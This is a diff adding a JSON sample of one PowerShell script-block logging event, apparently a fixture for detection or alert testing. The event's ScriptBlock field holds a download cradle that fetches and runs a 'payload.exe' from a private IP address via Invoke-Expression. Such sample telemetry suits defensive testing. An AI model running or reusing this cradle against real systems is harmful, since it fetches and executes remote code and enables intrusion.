@@ -1,0 +1,11 @@
+[
+  {
+    "TimeGenerated": "2026-02-23T14:23:20Z",
+    "EventID": 4104,
+    "Computer": "SRV-APP-01",
+    "ScriptBlock": "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.10/payload.exe')",
+    "ScriptBlockId": "7b8a9c3d-4e5f-6a7b-8c9d-0e1f2a3b4c5d",
+    "Path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "User": "JDOE"
+  }
+]
